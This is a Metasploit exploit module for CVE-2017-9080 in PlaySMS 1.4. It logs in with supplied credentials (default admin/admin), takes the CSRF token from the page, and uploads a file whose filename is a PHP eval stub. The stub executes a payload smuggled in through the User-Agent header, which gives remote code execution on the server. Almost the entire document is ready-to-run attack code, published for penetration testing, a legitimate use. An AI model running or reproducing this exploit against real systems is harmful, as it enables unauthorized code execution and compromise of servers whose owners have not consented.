# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039; => &#039;PlaySMS sendfromfile.php Authenticated "Filename" Field Code Execution&#039;,
      &#039;Description&#039; => %q{
          This module exploits a code injection vulnerability within an authenticated file
          upload feature in PlaySMS v1.4. This issue is caused by improper file name handling
          in sendfromfile.php file.
          Authenticated Users can upload a file and rename the file with a malicious payload.
          This module was tested against PlaySMS 1.4 on VulnHub&#039;s Dina 1.0 machine and Windows 7.
      },
      &#039;Author&#039; =>
        [
          &#039;Touhid M.Shaikh <touhidshaikh22[at]gmail.com>&#039;, # Discoverys and Metasploit Module
          &#039;DarkS3curity&#039; # Metasploit Module
        ],
      &#039;License&#039; => MSF_LICENSE,
      &#039;References&#039; =>
        [
          [&#039;EDB&#039;,&#039;42003&#039;],
          [&#039;CVE&#039;,&#039;2017-9080&#039;],
          [&#039;URL&#039;,&#039;https://www.youtube.com/watch?v=MuYoImvfpew&#039;],
          [&#039;URL&#039;,&#039;http://touhidshaikh.com/blog/?p=336&#039;]
        ],
      &#039;DefaultOptions&#039; =>
        {
          &#039;SSL&#039;     => false,
          &#039;ENCODER&#039; => &#039;php/base64&#039;,
        },
      &#039;Privileged&#039; => false,
      &#039;Platform&#039;   => [&#039;php&#039;],
      &#039;Arch&#039;       => ARCH_PHP,
      &#039;Targets&#039; =>
        [
          [ &#039;PlaySMS 1.4&#039;, { } ],
        ],
      &#039;DefaultTarget&#039;  => 0,
      &#039;DisclosureDate&#039; => &#039;May 21 2017&#039;))

    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;, [ true, "Base playsms directory path", &#039;/&#039;]),
        OptString.new(&#039;USERNAME&#039;, [ true, "Username to authenticate with", &#039;admin&#039;]),
        OptString.new(&#039;PASSWORD&#039;, [ true, "Password to authenticate with", &#039;admin&#039;])
      ])
  end

  def uri
    return target_uri.path
  end

  def check
    begin
      res = send_request_cgi({
        &#039;method&#039; => &#039;GET&#039;,
        &#039;uri&#039; => normalize_uri(uri, &#039;index.php&#039;)
      })
    rescue
      vprint_error(&#039;Unable to access the index.php file&#039;)
      return CheckCode::Unknown
    end

    if res.code == 302 && res.headers[&#039;Location&#039;].include?(&#039;index.php?app=main&inc=core_auth&route=login&#039;)
      return Exploit::CheckCode::Appears
    end

    CheckCode::Safe
  end

  def login
    res = send_request_cgi({
      &#039;uri&#039; => normalize_uri(uri, &#039;index.php&#039;),
      &#039;method&#039; => &#039;GET&#039;,
      &#039;vars_get&#039; => {
        &#039;app&#039; => &#039;main&#039;,
        &#039;inc&#039; => &#039;core_auth&#039;,
        &#039;route&#039; => &#039;login&#039;,
      }
    })

    # Grabbing CSRF token from body
    /name="X-CSRF-Token" value="(?<csrf>[a-z0-9"]+)">/ =~ res.body
    fail_with(Failure::UnexpectedReply, "#{peer} - Could not determine CSRF token") if csrf.nil?
    vprint_good("X-CSRF-Token for login : #{csrf}")

    cookies = res.get_cookies
    vprint_status(&#039;Trying to Login ......&#039;)
    # Send Creds with cookies.
    res = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => normalize_uri(uri, &#039;index.php&#039;),
      &#039;cookie&#039; => cookies,
      &#039;vars_get&#039; => Hash[{
        &#039;app&#039; => &#039;main&#039;,
        &#039;inc&#039; => &#039;core_auth&#039;,
        &#039;route&#039; => &#039;login&#039;,
        &#039;op&#039; => &#039;login&#039;,
      }.to_a.shuffle],
      &#039;vars_post&#039; => Hash[{
        &#039;X-CSRF-Token&#039; => csrf,
        &#039;username&#039; => datastore[&#039;USERNAME&#039;],
        &#039;password&#039; => datastore[&#039;PASSWORD&#039;]
      }.to_a.shuffle],
    })

    fail_with(Failure::UnexpectedReply, "#{peer} - Did not respond to Login request") if res.nil?

    # Try to access index page with authenticated cookie.
    res = send_request_cgi({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039; => normalize_uri(uri, &#039;index.php&#039;),
      &#039;cookie&#039; => cookies,
    })

    fail_with(Failure::UnexpectedReply, "#{peer} - Did not respond to Login request") if res.nil?

    # if we redirect to core_welcome dan we assume we have authenticated cookie.
    if res.code == 302 && res.headers[&#039;Location&#039;].include?(&#039;index.php?app=main&inc=core_welcome&#039;)
      print_good("Authentication successful : [ #{datastore[&#039;USERNAME&#039;]} : #{datastore[&#039;PASSWORD&#039;]} ]")
      store_valid_credential(user: datastore[&#039;USERNAME&#039;], private: datastore[&#039;PASSWORD&#039;])
      return cookies
    else
      fail_with(Failure::UnexpectedReply, "#{peer} - Authentication Failed :[ #{datastore[&#039;USERNAME&#039;]}:#{datastore[&#039;PASSWORD&#039;]} ]")
    end
  end

  def exploit
    cookies = login

    # Agian CSRF token.
    res = send_request_cgi({
      &#039;uri&#039; => normalize_uri(uri, &#039;index.php&#039;),
      &#039;method&#039; => &#039;GET&#039;,
      &#039;cookie&#039; => cookies,
      &#039;vars_get&#039; => Hash[{
        &#039;app&#039; => &#039;main&#039;,
        &#039;inc&#039; => &#039;feature_sendfromfile&#039;,
        &#039;op&#039; => &#039;list&#039;,
      }.to_a.shuffle]
    })

    fail_with(Failure::UnexpectedReply, "#{peer} - Did not respond to Login request") if res.nil?

    # Grabbing CSRF token from body.
    /name="X-CSRF-Token" value="(?<csrf>[a-z0-9"]+)">/ =~ res.body
    fail_with(Failure::UnexpectedReply, "#{peer} - Could not determine CSRF token") if csrf.nil?
    vprint_good("X-CSRF-Token for upload : #{csrf}")

    # Payload.
    evilname = "<?php $t=$_SERVER[&#039;HTTP_USER_AGENT&#039;]; eval($t); ?>"

    # setup POST request.
    post_data = Rex::MIME::Message.new
    post_data.add_part(csrf, content_type = nil, transfer_encoding = nil, content_disposition = &#039;form-data; name="X-CSRF-Token"&#039;) # CSRF token
    post_data.add_part("#{rand_text_alpha(8 + rand(5))}", content_type = &#039;application/octet-stream&#039;, transfer_encoding = nil, content_disposition = "form-data; name=\"fncsv\"; filename=\"#{evilname}\"")  # payload
    post_data.add_part("1", content_type = nil, transfer_encoding = nil, content_disposition = &#039;form-data; name="fncsv_dup"&#039;)  # extra
    data = post_data.to_s

    vprint_status(&#039;Trying to upload file with malicious Filename Field....&#039;)
    # Lets Send Upload request.
    res = send_request_cgi({
      &#039;uri&#039; => normalize_uri(uri, &#039;index.php&#039;),
      &#039;method&#039; => &#039;POST&#039;,
      &#039;agent&#039; => payload.encode,
      &#039;cookie&#039; => cookies,
      &#039;vars_get&#039; => Hash[{
        &#039;app&#039; => &#039;main&#039;,
        &#039;inc&#039; => &#039;feature_sendfromfile&#039;,
        &#039;op&#039; => &#039;upload_confirm&#039;,
      }.to_a.shuffle],
      &#039;headers&#039; => {
        &#039;Upgrade-Insecure-Requests&#039; => &#039;1&#039;,
      },
      &#039;Connection&#039; => &#039;close&#039;,
      &#039;data&#039; => data,
      &#039;ctype&#039; => "multipart/form-data; boundary=#{post_data.bound}",
    })
  end
end

